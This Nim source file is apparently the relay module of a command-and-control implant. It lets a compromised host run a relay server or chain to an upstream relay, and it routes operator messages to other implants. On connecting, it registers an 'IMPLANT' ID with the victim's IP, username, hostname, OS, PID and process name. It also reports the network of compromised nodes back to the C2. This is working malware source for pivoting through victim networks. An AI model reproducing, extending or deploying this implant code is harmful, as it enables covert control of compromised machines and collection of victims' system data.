import strutils, json, times, tables
import ../../core/relay/[relay_protocol, relay_comm, relay_config, relay_topology]
import ../../util/sysinfo

# Local adaptive timeout calculation to avoid circular imports
proc getLocalAdaptiveTimeout(): int =
    # Start with reasonable defaults and adjust based on success/failure
    result = 100  # 100ms base timeout

# Global relay state using relay_comm.nim types - NO MORE DIRECT SOCKETS!
var g_relayServer*: RelayServer
var upstreamRelay*: RelayConnection
var isConnectedToRelay* = false

# Helper functions for main.nim compatibility
proc isRelayServer*(): bool = g_relayServer.isListening
proc relayServerPort*(): int = g_relayServer.port
proc getRelayConnections*(): int = 
    let stats = getConnectionStats(g_relayServer)
    return stats.connections

# Export connection stats function for main.nim
proc getConnectionStats*(server: RelayServer): tuple[connections: int, activeConnections: int, registeredClients: int] {.exportc.} =
    let stats = relay_comm.getConnectionStats(server)
    return (connections: stats.connections, activeConnections: stats.connections, registeredClients: stats.registeredClients)

# Export broadcast message function for main.nim  
proc broadcastMessage*(server: RelayServer, message: RelayMessage): bool {.exportc.} =
    var mutableServer = server  # Create mutable copy
    let sent = relay_comm.broadcastMessage(mutableServer, message)
    return sent > 0

# Export unicast message function for main.nim (PREFERRED)
proc sendToClient*(server: RelayServer, clientID: string, message: RelayMessage): bool {.exportc.} =
    var mutableServer = server  # Create mutable copy
    return relay_comm.sendToClient(mutableServer, clientID, message)

# Export connected clients list function for main.nim
proc getConnectedClients*(server: RelayServer): seq[string] {.exportc.} =
    return relay_comm.getConnectedClients(server)

# Process relay commands - USING SAFE relay_comm.nim FUNCTIONS
proc processRelayCommand*(cmd: string): string =
    let parts = cmd.split(" ")
    if parts.len < 2:
        return "Usage: relay <command> [args]"
    
    case parts[1]:
    of "port":
        if parts.len < 3:
            return "Usage: relay port <port_number>"
        
        let port = parseInt(parts[2])
        if g_relayServer.isListening:
            return "Relay server already running on port " & $g_relayServer.port
        
        try:
            when defined debug:
                echo "[DEBUG] 🔧 RELAY COMMANDS: Starting relay server on port " & $port
            
            # USE SAFE FUNCTION FROM relay_comm.nim
            g_relayServer = startRelayServer(port)
            
            when defined debug:
                echo "[DEBUG] 🔧 RELAY COMMANDS: After startRelayServer() call:"
                echo "[DEBUG] 🔧 RELAY COMMANDS: - isListening: " & $g_relayServer.isListening
                echo "[DEBUG] 🔧 RELAY COMMANDS: - port: " & $g_relayServer.port
            
            if g_relayServer.isListening:
                when defined debug:
                    echo "[DEBUG] 🔧 RELAY COMMANDS: ✅ Relay server started successfully!"
                
                # TOPOLOGY EVENT: Detect hybrid transition
                # If we have a relay client ID, this means we're becoming hybrid
                if relay_topology.g_relayClientID != "" and relay_topology.g_relayClientID != "PENDING-REGISTRATION":
                    when defined debug:
                        echo "[DEBUG] 🌐 TOPOLOGY: Client " & relay_topology.g_relayClientID & " becoming HYBRID on port " & $port
                    # Note: detectHybridTransition will be defined below
                
                return "Relay server started on port " & $port
            else:
                when defined debug:
                    echo "[DEBUG] 🔧 RELAY COMMANDS: ❌ Relay server failed to start"
                return "Failed to start relay server on port " & $port
        except:
            return "Failed to start relay server: " & getCurrentExceptionMsg()
    
    of "connect":
        if parts.len < 3:
            return "Usage: relay connect relay://ip:port"
        
        let relayUrl = parts[2]
        if not relayUrl.startsWith("relay://"):
            return "Invalid relay URL format. Use: relay://ip:port"
        
        try:
            let cleanUrl = relayUrl.replace("relay://", "").strip(chars = {'"'})
            let urlParts = cleanUrl.split(":")
            if urlParts.len != 2:
                return "Invalid relay URL format"
            
            let host = urlParts[0]
            let port = parseInt(urlParts[1])
            
            if upstreamRelay.isConnected:
                return "Already connected to upstream relay"
            
            # USE SAFE FUNCTION FROM relay_comm.nim
            upstreamRelay = connectToRelay(host, port)
            if upstreamRelay.isConnected:
                isConnectedToRelay = true  # Disable HTTP communication
                
                # Send registration message with complete system info
                let implantID = generateImplantID("IMPLANT")
                let route = @[implantID, "UPSTREAM"]
                
                # Collect system information for relay registration  
                let localIP = getLocalIP()
                let username = getUsername()
                let hostname = getSysHostname()
                let osInfo = getOSInfo()
                let pid = getCurrentPID()
                let processName = getCurrentProcessName()
                
                # Create complete registration data as JSON
                let regData = %*{
                    "implantID": implantID,
                    "localIP": localIP,
                    "username": username,
                    "hostname": hostname,
                    "osInfo": osInfo,
                    "pid": pid,
                    "processName": processName,
                    "timestamp": epochTime().int64,
                    "capabilities": ["relay", "client"],
                    "mode": "relay_connect"
                }
                
                let registerMsg = createMessage(REGISTER, implantID, route, $regData)
                
                if sendMessage(upstreamRelay, registerMsg):
                    when defined debug:
                        echo "[DEBUG] Connected and registered with upstream relay, HTTP communication disabled"
                    return "Connected to upstream relay at " & host & ":" & $port 
                else:
                    return "Connected but failed to register with relay"
            else:
                return "Failed to connect to relay"
        except:
            return "Failed to connect to relay: " & getCurrentExceptionMsg()
    
    of "disconnect":
        if not upstreamRelay.isConnected:
            return "Not connected to any upstream relay"
        
        try:
            # USE SAFE FUNCTION FROM relay_comm.nim
            closeConnection(upstreamRelay)
            isConnectedToRelay = false  # Re-enable HTTP communication
            when defined debug:
                echo "[DEBUG] Disconnected from upstream relay, HTTP communication re-enabled"
            return "Disconnected from upstream relay (HTTP re-enabled)"
        except:
            return "Failed to disconnect: " & getCurrentExceptionMsg()
    
    of "status":
        var status = "=== Multi-Client Relay Status ===\n"
        status &= "Relay Server: " & (if g_relayServer.isListening: "Running on port " & $g_relayServer.port else: "Stopped") & "\n"
        
        let stats = getConnectionStats(g_relayServer)
        status &= "Total Connections: " & $stats.connections & "\n"
        status &= "Registered Clients: " & $stats.registeredClients & "\n"
        
        # List connected clients
        if g_relayServer.isListening and stats.registeredClients > 0:
            let connectedClients = relay_comm.getConnectedClients(g_relayServer)
            status &= "Client List: "
            for i, clientID in connectedClients:
                if i > 0: status &= ", "
                status &= clientID
            status &= "\n"
        
        status &= "Upstream Relay: " & (if upstreamRelay.isConnected: "Connected" else: "Disconnected") & "\n"
        status &= "HTTP to C2: " & (if isConnectedToRelay: "DISABLED (using relay)" else: "ENABLED") & "\n"
        status &= "Protocol: Multi-Client relay_comm.nim (secure)\n"
        status &= "Features: Auto-registration, Unicast routing, Connection pooling\n"
        return status
    
    of "stop":
        if not g_relayServer.isListening:
            return "Relay server is not running"
        
        try:
            # USE SAFE FUNCTION FROM relay_comm.nim
            closeRelayServer(g_relayServer)
            return "Multi-client relay server stopped (secure shutdown)"
        except:
            return "Failed to stop relay server: " & getCurrentExceptionMsg()
    
    of "clients":
        if not g_relayServer.isListening:
            return "Relay server is not running"
        
        let stats = getConnectionStats(g_relayServer)
        var result = "=== Connected Relay Clients ===\n"
        result &= "Total connections: " & $stats.connections & "\n"
        result &= "Registered clients: " & $stats.registeredClients & "\n\n"
        
        if stats.registeredClients > 0:
            let connectedClients = getConnectedClients(g_relayServer)
            result &= "Client List:\n"
            for i, clientID in connectedClients:
                result &= "  " & $(i + 1) & ". " & clientID & "\n"
        else:
            result &= "No clients registered\n"
        
        return result
    
    of "send":
        if parts.len < 4:
            return "Usage: relay send <clientID> <message>"
        
        if not g_relayServer.isListening:
            return "Relay server is not running"
        
        let targetClientID = parts[2]
        let message = parts[3..^1].join(" ")
        
        # Create a test message to send to specific client
        let testMsg = createMessage(HTTP_RESPONSE, "RELAY-SERVER", @[targetClientID], message)
        let success = sendToClient(g_relayServer, targetClientID, testMsg)
        
        if success:
            return "Message sent to client: " & targetClientID
        else:
            return "Failed to send message to client: " & targetClientID & " (client not found or disconnected)"
    
    else:
        return "Unknown relay command. Available:\n" &
               "  relay port <port>      - Start multi-client relay server\n" &
               "  relay connect <url>    - Connect to upstream relay\n" &
               "  relay disconnect       - Disconnect from upstream\n" &
               "  relay status           - Show relay and client status\n" &
               "  relay clients          - List connected clients\n" &
               "  relay send <id> <msg>  - Send message to specific client\n" &
               "  relay stop             - Stop relay server"

# Poll relay server for new messages - USING SAFE FUNCTIONS
proc pollRelayServerMessages*(): seq[RelayMessage] =
    if not g_relayServer.isListening:
        return @[]
    
    try:
        # CRITICAL: Process ALL available messages to prevent backlog
        var allMessages: seq[RelayMessage] = @[]
        var continuePolling = true
        var pollCount = 0
        
        while continuePolling and pollCount < 10:  # Max 10 polls to prevent infinite loop
            pollCount += 1
            let adaptiveTimeout = getLocalAdaptiveTimeout()
            let messages = pollRelayServer(g_relayServer, adaptiveTimeout)
            
            if messages.len > 0:
                allMessages.add(messages)
                when defined debug:
                    echo "[DEBUG] 🔄 Relay polling cycle " & $pollCount & ": got " & $messages.len & " messages (timeout: " & $adaptiveTimeout & "ms)"
            else:
                continuePolling = false  # No more messages available
                when defined debug:
                    echo "[DEBUG] 🔄 No more messages available in cycle " & $pollCount
        
        when defined debug:
            if allMessages.len > 0:
                echo "[DEBUG] 📥 Total messages processed: " & $allMessages.len & " (in " & $pollCount & " cycles)"
        
        return allMessages
    except Exception as e:
        when defined debug:
            echo "[DEBUG] Error polling relay server messages: " & e.msg
        return @[]

# Poll upstream relay for messages - USING SAFE FUNCTIONS
proc pollUpstreamRelayMessages*(): seq[RelayMessage] =
    when defined debug:
        echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Checking connection status: " & $upstreamRelay.isConnected
    
    if not upstreamRelay.isConnected:
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Not connected, returning empty array"
        return @[]
    
    try:
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Calling pollMessages with adaptive timeout"
        
        # USE SAFE FUNCTION FROM relay_comm.nim - ADAPTIVE TIMEOUT to adjust to network conditions
        let adaptiveTimeout = getLocalAdaptiveTimeout()
        let messages = pollMessages(upstreamRelay, adaptiveTimeout)
        
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Got " & $messages.len & " messages (timeout: " & $adaptiveTimeout & "ms)"
        
        return messages
    except Exception as e:
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Error polling upstream relay messages: " & e.msg
        upstreamRelay.isConnected = false
        return @[]

# Cleanup dead connections - USING SAFE FUNCTIONS
proc cleanupRelayConnections*() =
    if g_relayServer.isListening:
        cleanupConnections(g_relayServer)

# ============================================================================
# TOPOLOGY MANAGEMENT AND EVENT PROPAGATION SYSTEM
# ============================================================================

# Import topology types and functions from relay_topology module
# (already imported above)

# Track previous client state to detect changes
var g_previousClients: seq[string] = @[]
var g_lastTopologyCheck: int64 = 0

# Create RelayNodeInfo from system information
proc createNodeInfo(nodeID: string, nodeType: string, isListening: bool = false, port: int = 0): RelayNodeInfo =
    result.nodeID = nodeID
    result.nodeType = nodeType
    result.hostname = getSysHostname()
    result.ipExternal = getLocalIP()
    result.ipInternal = getLocalIP()
    result.listeningPort = if isListening: port else: 0
    result.upstreamHost = ""
    result.upstreamPort = 0
    result.directChildren = @[]
    result.lastSeen = epochTime().int64

# Propagate topology update to upstream (C2 or parent relay)
proc propagateTopologyUpdate(eventType: string, nodeInfo: RelayNodeInfo) =
    when defined debug:
        echo "[DEBUG] 🌐 Topology: Propagating " & eventType & " for node " & nodeInfo.nodeID
    
    # If we're connected to upstream relay, send via relay
    if upstreamRelay.isConnected:
        let topologyMsg = createTopologyUpdateMessage(
            relay_topology.g_relayClientID,
            @[relay_topology.g_relayClientID, "RELAY-SERVER"],
            eventType,
            nodeInfo
        )
        
        let success = sendMessage(upstreamRelay, topologyMsg)
        when defined debug:
            if success:
                echo "[DEBUG] 🌐 Topology: Sent " & eventType & " to upstream relay"
            else:
                echo "[DEBUG] 🌐 Topology: Failed to send " & eventType & " to upstream relay"
    else:
        # Send directly to C2 server via HTTP
        when defined debug:
            echo "[DEBUG] 🌐 Topology: Sending " & eventType & " to C2 via HTTP"
        
        try:
            # Create topology update message
            let topologyData = %*{
                "type": eventType,
                "timestamp": epochTime().int64,
                "topology": {
                    "root": {
                        "id": relay_topology.g_localTopology.rootNodeID,
                        "type": "relay_server"
                    },
                    "nodes": relay_topology.g_localTopology.nodes,
                    "event_node": nodeInfo
                }
            }
            
            when defined debug:
                echo "[DEBUG] 🌐 Topology: Prepared topology data for C2: " & $topologyData
                echo "[DEBUG] 🌐 Topology: HTTP send to C2 will be handled by main loop"
                
            # Store topology data globally for main loop to send
            # This will be handled by the main HTTP communication loop
            
        except Exception as e:
            when defined debug:
                echo "[DEBUG] 🌐 Topology: Error preparing topology data: " & e.msg

# Detect and report topology changes
proc detectTopologyChanges*() =
    if not g_relayServer.isListening:
        return
    
    let currentTime = epochTime().int64
    
    # Only check every 5 seconds to avoid spam
    if currentTime - g_lastTopologyCheck < 5:
        return
    
    g_lastTopologyCheck = currentTime
    
    # Get current connected clients
    let currentClients = getConnectedClients(g_relayServer)
    
    # Initialize topology if needed
    if not relay_topology.g_topologyInitialized:
        relay_topology.g_localTopology = initTopologyInfo(getRelayServerID())
        relay_topology.g_topologyInitialized = true
        
        # Add ourselves as the root relay server
        let relayServerInfo = createNodeInfo(
            getRelayServerID(), 
            "relay_server", 
            true, 
            g_relayServer.port
        )
        updateNodeInTopology(relay_topology.g_localTopology, relayServerInfo)
        
        when defined debug:
            echo "[DEBUG] 🌐 Topology: Initialized with relay server " & getRelayServerID()
    
    # Detect new connections
    for clientID in currentClients:
        if clientID notin g_previousClients:
            when defined debug:
                echo "[DEBUG] 🌐 Topology: New client connected: " & clientID
            
            # Create node info for new client
            var clientInfo = createNodeInfo(clientID, "relay_client")
            clientInfo.upstreamHost = relay_topology.g_localTopology.nodes[getRelayServerID()].ipInternal
            clientInfo.upstreamPort = g_relayServer.port
            
            # Update local topology
            updateNodeInTopology(relay_topology.g_localTopology, clientInfo)
            
            # Add as child to relay server
            addChildToNode(relay_topology.g_localTopology, getRelayServerID(), clientID)
            
            # Propagate the connection event
            propagateTopologyUpdate("node_connected", clientInfo)
    
    # Detect disconnections
    for prevClientID in g_previousClients:
        if prevClientID notin currentClients:
            when defined debug:
                echo "[DEBUG] 🌐 Topology: Client disconnected: " & prevClientID
            
            # Get node info before removing
            if relay_topology.g_localTopology.nodes.hasKey(prevClientID):
                let disconnectedInfo = relay_topology.g_localTopology.nodes[prevClientID]
                
                # Remove from local topology
                removeNodeFromTopology(relay_topology.g_localTopology, prevClientID)
                
                # Propagate the disconnection event
                propagateTopologyUpdate("node_disconnected", disconnectedInfo)
    
    # Update previous state
    g_previousClients = currentClients
    
    when defined debug:
        if currentClients.len != g_previousClients.len:
            echo "[DEBUG] 🌐 Topology: Client count changed: " & $g_previousClients.len & " -> " & $currentClients.len

# Detect when a client becomes hybrid (starts its own relay server)
proc detectHybridTransition*(clientID: string, newPort: int) =
    when defined debug:
        echo "[DEBUG] 🌐 Topology: Client " & clientID & " became hybrid on port " & $newPort
    
    if relay_topology.g_localTopology.nodes.hasKey(clientID):
        # Update the node to hybrid type
        relay_topology.g_localTopology.nodes[clientID].nodeType = "hybrid"
        relay_topology.g_localTopology.nodes[clientID].listeningPort = newPort
        relay_topology.g_localTopology.lastUpdated = epochTime().int64
        
        # Propagate the hybrid transition
        propagateTopologyUpdate("topology_changed", relay_topology.g_localTopology.nodes[clientID])

# Get complete topology for C2 reporting
proc getCompleteTopology*(): TopologyInfo =
    if relay_topology.g_topologyInitialized:
        return relay_topology.g_localTopology
    else:
        return initTopologyInfo(getRelayServerID())

# Force topology refresh and propagation
proc refreshTopology*() =
    when defined debug:
        echo "[DEBUG] 🌐 Topology: Forcing topology refresh"
    
    g_lastTopologyCheck = 0  # Reset timer to force immediate check
    detectTopologyChanges()

# Export topology as JSON for C2 server - MINIMAL DATA FOR SECURITY
proc exportTopologyJSON*(): string =
    let topology = getCompleteTopology()
    
    # Only send node IDs and basic connectivity info - C2 will enrich with DB data
    var nodeIDs: seq[string] = @[]
    var connectionsJson = newJArray()
    
    for nodeID, nodeInfo in topology.nodes:
        nodeIDs.add(nodeID)
        
        # Add parent-child relationships as JSON objects
        for childID in nodeInfo.directChildren:
            connectionsJson.add(%*{
                "parent": nodeID,
                "child": childID
            })
    
    # Minimal topology data - security focused
    var topologyJson = %*{
        "type": "topology_update",
        "topology": {
            "root_node_id": topology.rootNodeID,
            "node_ids": nodeIDs,
            "connections": connectionsJson,
            "last_updated": topology.lastUpdated,
            "total_nodes": topology.nodes.len
        }
    }
    
    when defined debug:
        echo "[DEBUG] 🔒 Topology: Sending minimal topology data (security mode)"
        echo "[DEBUG] 🔒 Topology: Root: " & topology.rootNodeID
        echo "[DEBUG] 🔒 Topology: Nodes: " & $nodeIDs.len
        echo "[DEBUG] 🔒 Topology: Connections: " & $connectionsJson.len
    
    return $topologyJson 